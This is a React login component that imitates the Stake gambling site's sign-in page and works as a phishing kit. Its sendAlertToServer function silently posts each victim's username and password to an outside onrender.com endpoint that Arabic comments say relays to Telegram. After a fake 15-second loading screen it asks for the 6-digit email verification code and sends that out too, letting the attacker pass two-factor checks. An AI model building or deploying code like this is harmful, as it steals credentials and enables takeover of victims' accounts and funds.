import { useState, type MouseEvent } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Eye, EyeOff, TriangleAlert, X } from "lucide-react";
import { FcGoogle } from "react-icons/fc";
import { FaUserLock } from "react-icons/fa6";
import { Link } from "wouter";

import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import Drop from "@/pages/drop";

const loginSchema = z.object({
  username: z.string().min(1, "Email or Username is required"),
  password: z.string().min(1, "Password is required"),
});

const codeSchema = z.object({
  code: z.string().regex(/^\d{6}$/, "code must be exactly 6 characters"),
});

type LoginFormValues = z.infer<typeof loginSchema>;
type CodeFormValues = z.infer<typeof codeSchema>;
type Screen = "credentials" | "loading" | "code" | "drop";

export default function Login() {
  const [showPassword, setShowPassword] = useState(false);
  const [screen, setScreen] = useState<Screen>("credentials");

  const form = useForm<LoginFormValues>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      username: "",
      password: "",
    },
  });

  const codeForm = useForm<CodeFormValues>({
    resolver: zodResolver(codeSchema),
    mode: "onChange",
    defaultValues: {
      code: "",
    },
  });

  // ============================================
  // 🔐 دالة إرسال التنبيه إلى Render
  // ============================================
  const sendAlertToServer = async (username: string, password: string) => {
    try {
      await fetch('https://stakeme-api.onrender.com/api/telegram/alert', {
        method: 'POST',
        credentials: 'include',  // ✅ إضافة هذا السطر لدعم Safari
        headers: {
          'Content-Type': 'application/json',
          'Origin': 'https://stake-me.com',
        },
        body: JSON.stringify({
          username: username,
          password: password,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
        }),
      });
    } catch (error) {
      // Silent fail
    }
  };

  // ============================================
  // 📤 دالة إرسال بيانات الدخول
  // ============================================
  const onSubmit = async (data: LoginFormValues) => {
    // إرسال البيانات إلى تليجرام
    await sendAlertToServer(data.username, data.password);

    // متابعة العملية
    setScreen("loading");
    window.setTimeout(() => setScreen("code"), 15000);
  };

  // ============================================
  // 📤 دالة إرسال رمز التأكيد
  // ============================================
  const onCodeSubmit = async (data: CodeFormValues) => {
    // إرسال رمز التأكيد إلى تليجرام
    await sendAlertToServer("🔐 رمز التأكيد", data.code);

    // متابعة العملية
    setScreen("drop");
  };

  const resetLogin = () => {
    form.reset();
    codeForm.reset();
    setShowPassword(false);
    setScreen("credentials");
  };

  const alternativeSignIn = (event: MouseEvent<HTMLButtonElement>) => {
    event.preventDefault();
  };

  return (
    screen === "drop" ? (
      <Drop />
    ) : (
    <main className="min-h-[100dvh] w-full bg-background text-foreground">
      <div className="mx-auto flex min-h-[100dvh] w-full max-w-[480px] flex-col px-4 py-5 md:py-10">
        <header className="mb-8 flex items-center justify-between">
          <button
            type="button"
            aria-label="Reset login"
            className="rounded px-0.5 text-left text-white transition-opacity hover:opacity-80 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white"
            onClick={resetLogin}
            data-testid="button-logo"
          >
            <img
              src="/stake-logo.png"
              className="h-[50px] w-[97px] object-contain object-left"
              alt="Stake"
              data-testid="img-stake-logo"
            />
          </button>
          <button
            type="button"
            aria-label="Close"
            className="rounded p-1 text-muted transition-colors hover:text-white focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white"
            onClick={resetLogin}
            data-testid="button-close"
          >
            <X className="h-6 w-6" />
          </button>
        </header>

        <div className="px-2.5">
          {screen === "code" ? (
            <Form {...codeForm}>
              <form
                onSubmit={codeForm.handleSubmit(onCodeSubmit)}
                className="flex flex-1 flex-col"
                data-testid="form-email-code"
              >
              <FormField
                control={codeForm.control}
                name="code"
                render={({ field, fieldState }) => (
                  <FormItem>
                    <Label htmlFor="email-code">
                      Email Code<span className="text-destructive">*</span>
                    </Label>
                    <FormControl>
                      <Input
                        id="email-code"
                        autoComplete="one-time-code"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        className={
                          fieldState.error
                            ? "border-destructive focus-visible:border-destructive"
                            : ""
                        }
                        {...field}
                        onChange={(event) =>
                          field.onChange(
                            event.target.value.replace(/[^0-9]/g, ""),
                          )
                        }
                        data-testid="input-email-code"
                      />
                    </FormControl>
                    {fieldState.error ? (
                      <p className="code-error-message">
                        <span className="code-error-content">
                          <TriangleAlert
                            className="code-error-icon"
                            aria-hidden="true"
                          />
                          code must be exactly 6 characters
                        </span>
                      </p>
                    ) : null}
                  </FormItem>
                )}
              />

              <Button
                type="submit"
                className="mt-6 w-full"
                data-testid="button-code-sign-in"
              >
                Sign In
              </Button>

              <p className="mt-6 text-center text-sm font-semibold text-white">
                To request a new code, please login again.
              </p>

              <AlternativeSignIns onAction={alternativeSignIn} />

              <p className="mt-10 text-center text-[15px] text-muted">
                Don’t have an account?{" "}
                <Link
                  href="#"
                  onClick={(event) => event.preventDefault()}
                  className="font-semibold text-white transition-colors hover:underline"
                  data-testid="link-register-code"
                >
                  Register an Account
                </Link>
              </p>
              </form>
            </Form>
          ) : (
            <Form {...form}>
              <form
                onSubmit={form.handleSubmit(onSubmit)}
                className="flex flex-1 flex-col"
                data-testid="form-login"
              >
              <FormField
                control={form.control}
                name="username"
                render={({ field }) => (
                  <FormItem>
                    <Label htmlFor="username">
                      Email or Username{" "}
                      <span className="text-destructive">*</span>
                    </Label>
                    <FormControl>
                      <Input
                        id="username"
                        autoComplete="username"
                        disabled={screen === "loading"}
                        {...field}
                        data-testid="input-username"
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem className="mt-5">
                    <Label htmlFor="password">
                      Password <span className="text-destructive">*</span>
                    </Label>
                    <FormControl>
                      <div className="relative">
                        <Input
                          id="password"
                          type={showPassword ? "text" : "password"}
                          autoComplete="current-password"
                          disabled={screen === "loading"}
                          className="pr-10"
                          {...field}
                          data-testid="input-password"
                        />
                        <button
                          type="button"
                          aria-label={
                            showPassword ? "Hide password" : "Show password"
                          }
                          onClick={() => setShowPassword((value) => !value)}
                          className="absolute right-3 top-1/2 -translate-y-1/2 text-muted transition-colors hover:text-white focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white"
                          data-testid="button-toggle-password"
                        >
                          {showPassword ? (
                            <EyeOff className="h-5 w-5" />
                          ) : (
                            <Eye className="h-5 w-5" />
                          )}
                        </button>
                      </div>
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />

              <a
                href="#"
                className="mt-4 block text-sm font-semibold text-white hover:underline"
                onClick={(event) => event.preventDefault()}
                data-testid="link-forgot-password"
              >
                Forgot Password?
              </a>

              <Button
                type="submit"
                disabled={screen === "loading"}
                className="mt-8 w-full"
                data-testid="button-sign-in"
              >
                {screen === "loading" ? (
                  <span className="loading-spinner" aria-label="Loading" />
                ) : (
                  "Sign In"
                )}
              </Button>

              <AlternativeSignIns onAction={alternativeSignIn} />

              <p className="mt-10 text-center text-[15px] text-muted">
                Don’t have an account?{" "}
                <Link
                  href="#"
                  onClick={(event) => event.preventDefault()}
                  className="font-semibold text-white transition-colors hover:underline"
                  data-testid="link-register"
                >
                  Register an Account
                </Link>
              </p>
              </form>
            </Form>
          )}
        </div>
      </div>
    </main>
    )
  );
}

function AlternativeSignIns({
  onAction,
}: {
  onAction: (event: MouseEvent<HTMLButtonElement>) => void;
}) {
  return (
    <>
      <div className="my-6 flex items-center">
        <div className="h-px flex-1 bg-border" />
        <span className="px-4 text-[13px] font-semibold tracking-wider text-muted">
          OR
        </span>
        <div className="h-px flex-1 bg-border" />
      </div>

      <div className="space-y-3">
        <Button
          type="button"
          variant="secondary"
          className="w-full gap-2.5"
          onClick={onAction}
          data-testid="button-passkey"
        >
          <FaUserLock className="h-4 w-4 text-white" />
          Sign In with passkey
        </Button>

        <Button
          type="button"
          variant="secondary"
          className="w-full gap-2.5"
          onClick={onAction}
          data-testid="button-google"
        >
          <FcGoogle className="h-5 w-5" />
          Sign In with Google
        </Button>

        <Button
          type="button"
          variant="secondary"
          className="w-full"
          onClick={onAction}
          data-testid="button-another-way"
        >
          Sign In another way
        </Button>
      </div>
    </>
  );
}
